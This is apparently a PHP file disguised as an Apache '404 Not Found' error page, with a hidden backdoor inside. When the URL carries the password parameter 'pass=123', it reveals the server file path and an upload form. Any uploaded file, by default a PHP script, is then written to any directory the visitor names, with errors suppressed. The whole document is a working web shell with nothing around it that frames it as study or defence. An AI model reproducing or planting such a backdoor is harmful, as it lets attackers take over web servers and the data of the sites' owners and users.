<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache Server at <?php $_SERVER["HTTP_HOST"] ?> Port 80 </address>
<style>
input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>

<?php
$upload = <<<EOD
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="file"  /><br>
文件名:<input type="text" name="name" value="1.php" /><br>
上传目录:<input type="text" name="dir" value="./" />
<input type="submit" name="submit" value="upload" />
</form>
EOD;
$filename = @$_POST['name'];
$dir =@$_POST['dir'];
if(@$_GET['pass'] == 123){
	echo '当前目录: '. __FILE__ .'<br>';
	echo $upload;
	if(isset($filename)){
		@move_uploaded_file($_FILES['file']['tmp_name'],$dir.'/'.$filename);
		echo "upload successed !";
	}
}
?>